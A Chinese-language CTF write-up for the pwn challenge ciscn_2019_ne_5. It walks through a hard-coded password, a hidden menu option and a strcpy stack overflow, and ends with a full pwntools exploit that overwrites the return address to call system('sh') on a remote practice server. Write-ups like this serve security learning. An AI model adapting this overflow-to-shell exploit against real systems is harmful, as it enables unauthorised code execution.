首先检查安全机制

![image-20201105215357163](https://static.hack1s.fun/images/2021/02/06/image-20201105215357163.png)

开启了NX的32位程序

运行后是一个输入password的地方

![image-20201105215428495](https://static.hack1s.fun/images/2021/02/06/image-20201105215428495.png)

反编译逆向看到

![image-20201106113658304](https://static.hack1s.fun/images/2021/02/06/image-20201106113658304.png)

输入administrator就可以过去，后面的程序是一个循环

输出显示的只有4个选项，但是实际上看到switch中还有一个隐藏的选项

AddLog这个选项通过scanf输入一个log，长度限制是128

![image-20201106113741030](https://static.hack1s.fun/images/2021/02/06/image-20201106113741030.png)

在GetFlag这个函数中有一个strcpy，但是这里的目标串dst距离ebp只有0x48

因此有可能溢出

![image-20201106113901780](https://static.hack1s.fun/images/2021/02/06/image-20201106113901780.png)

在选项`Print`那里是用到了`system`

在程序中没有找到`/bin/sh`

但是存在`sh`

那么思路就是首先用第一个选项输入payload

之后用选项4造成溢出并且调用`system("sh")`

```python
from pwn import *

io = remote('node3.buuoj.cn',28345)
#io = process('./ciscn_2019_ne_5')
elf = ELF('./ciscn_2019_ne_5')

io.recvuntil('password:')
io.sendline('administrator')
io.recvuntil('\n:')
io.sendline(str(1))

sh_addr = 0x080482ea
payload = 'a'*0x48 + 'b'*0x4 + p32(elf.sym['system']) +p32(elf.sym['main'])+ p32(sh_addr)

io.sendline(payload)
io.sendline(str(4))

io.interactive()
```

